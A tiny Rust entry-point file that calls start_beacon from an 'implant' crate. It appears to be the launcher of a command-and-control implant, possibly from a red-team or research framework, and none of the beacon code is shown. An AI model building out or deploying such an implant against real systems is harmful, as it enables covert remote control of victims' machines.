use implant::beacon::start_beacon;

#[tokio::main]
async fn main() {
    start_beacon().await;
}
